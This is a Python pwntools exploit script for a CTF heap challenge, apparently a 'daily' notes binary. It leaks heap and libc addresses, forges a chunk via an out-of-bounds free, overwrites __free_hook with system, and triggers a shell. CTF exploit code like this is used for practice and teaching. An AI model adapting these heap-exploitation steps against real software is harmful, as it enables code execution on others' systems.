from pwn import *

context.log_level = 'debug'
r = process("./pwn")
ptr = 0x602060
#r = remote("85c3e0fcae5e972af313488de60e8a5a.kr-lab.com", "58512")

def show():
    r.sendline(str(1))
    data = r.recvuntil("Your choice:")
    return data

def add(length, content):
    r.sendline(str(2))
    r.recvuntil("of daily:")
    r.sendline(str(length))
    r.recvuntil("daily\n")
    r.send(content)
    r.recvuntil("Your choice:")

def edit(index, content):
    r.sendline(str(3))
    r.recvuntil("of daily:")
    r.sendline(str(index))
    r.recvuntil("daily\n")
    r.send(content)
    r.recvuntil("Your choice:")

def remove(index):
    r.sendline(str(4))
    r.recvuntil("of daily:")
    r.sendline(str(index))
    r.recvuntil("Your choice:")

r.recvuntil("Your choice:")

add(0x100, 'a')#0
add(0x100, 'b')#1
add(0x100, 'c')#2
add(0x100, 'd')#3
remove(0)
remove(2)
add(0x100, 'a' * 8)#0
add(0x100, 'a' * 8)#2

gdb.attach(r)
r.sendline(str(1))
r.recvuntil("aaaaaaaa")
heap = u64(r.recvuntil("1 :")[:-3].ljust(8,'\0')) - 0x220
r.recvuntil("aaaaaaaa")
libc = u64(r.recvuntil("3 :")[:-3].ljust(8,'\0')) - 0x3c4b78

print "heap: " + hex(heap)
print "libc: " + hex(libc)

remove(0)
remove(1)
remove(2)
remove(3)

add(0x60, p64(heap + 0x30) * 2 + p64(0) + p64(0x51))#0
add(0x20, 'a')#1
add(0x50, 'a')#2
add(0x20, 'a')#3
remove((heap + 0x18 - ptr - 8) / 0x10)
edit(0, p64(0) * 3 + p64(0x51) + p64(ptr + 0x18))
remove(1)
add(0x40, 'a')#1
add(0x40, 'a')#4
edit(4, p64(ptr))
edit(2, p64(0x100) + p64(ptr) + p64(0) * 4)
edit(0, p64(0x100) + p64(ptr) + p64(0x100) + p64(libc + 0x3c67a8) + p64(0x100) + p64(libc + 0x18cd57))
edit(1, p64(libc + 0x045390))

#gdb.attach(r)
r.sendline(str(4))
r.recvuntil("of daily:")
r.sendline(str(2))

r.interactive()

